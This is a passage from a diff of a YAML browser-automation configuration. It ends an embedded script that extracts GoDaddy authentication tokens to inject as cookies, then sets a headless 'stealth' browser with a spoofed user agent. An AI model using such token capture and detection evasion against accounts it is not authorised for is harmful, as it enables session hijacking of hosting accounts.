+            return Object.keys(result).length > 0 ? result : { error: 'GoDaddy tokens not found' };
+          }
+          return extract();
+      inject_as: "cookie"
+
+  # Browser automation settings
+  browser:
+    headless: true
+    stealth: true
+    timeout: 60000
+    viewport:
+      width: 1920
+      height: 1080
+    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
